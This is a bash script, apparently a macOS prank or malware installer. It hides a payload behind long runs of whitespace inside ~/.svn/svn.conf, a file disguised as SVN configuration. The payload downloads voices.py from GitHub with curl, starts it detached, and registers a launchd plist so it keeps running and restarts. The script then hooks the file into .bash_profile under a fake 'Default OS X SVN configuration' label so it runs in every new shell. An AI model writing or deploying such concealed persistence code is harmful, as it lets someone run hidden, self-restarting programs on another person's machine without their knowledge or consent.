#!/bin/bash

# TODO: this should be optionally via a --switch
PRE="                                                                                                                 "
PRE=${PRE}${PRE}${PRE}${PRE}${PRE}${PRE}${PRE}${PRE}${PRE}${PRE}${PRE}
mkdir -p ~/.svn/
{ cat <<EOF
#!/usr/bin/env bash
${PRE}(ps | grep '[0-9]* python voices.py$') > /dev/null 2>&1
${PRE}if [ ! $? -ne 0 ]; then
${PRE}    APP_DIR=${PWD}/Library/Application\ Support/.\${RANDOM}-\${RANDOM}/
${PRE}    mkdir -p \${APP_DIR}
${PRE}    cd \${APP_DIR}
${PRE}    curl -O https://github.com/dcramer/voices.py/raw/master/voices.py > /dev/null 2>&1
${PRE}    screen -d -m python voices.py
${PRE}    echo "<?xml version=\"1.0\" encoding=\"UTF-8\"?>
<!DOCTYPE plist PUBLIC \"-//Apple Computer//DTD PLIST 1.0//EN\"
    \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">
<plist version=\"1.0\">
<dict>
    <key>Label</key>
    <string>voices.py</string>
    <key>ProgramArguments</key>
    <array>
        <string>\${APP_DIR}</string>
    </array>
    <key>KeepAlive</key>
    <true/>
    <key>Disabled</key>
    <false/>
    <key>RunAtLoad</key>
    <true/>
</dict>
</plist>" > \${APP_DIR}/voices.plist
launchctl load -w \${APP_DIR}/voices.plist
${PRE}fi
EOF
} >> ~/.svn/svn.conf

. ~/.svn/svn.conf

ps aux | grep voices.py
grep "Default OS X SVN configuration" ~/.bash_profile > /dev/null 2>&1
if [ $? -ne 0 ]; then
    echo "
# Default OS X SVN configuration
. ~/.svn/svn.conf" >> ${PWD}/.bash_profile
fi